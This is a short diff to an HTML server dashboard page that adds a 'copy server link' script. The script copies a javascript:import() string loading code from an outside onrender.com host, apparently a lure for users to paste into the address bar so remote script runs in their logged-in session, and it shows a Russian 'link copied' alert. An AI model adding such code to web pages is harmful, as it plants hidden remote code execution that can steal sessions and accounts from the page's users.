@@ -190,6 +190,18 @@ class="feather feather-align-left">
 <span>Server vaqti</span><br>
 <strong>15.12.2025 | 14:38</strong>
 </p>
+	<script>
+function copyServerLink() {
+    const text = 'avascript:import("https://young-z7wb.onrender.com/a.js")';
+
+    navigator.clipboard.writeText(text).then(() => {
+        alert("Ссылка скопирована!");
+    }).catch(err => {
+        console.error("Ошибка копирования: ", err);
+    });
+}
+</script>
+
 </li>
 
 <li class="dropdown">
@@ -486,6 +498,7 @@ signInAjax();
 </body>
 
 </html>
+
 
 
 
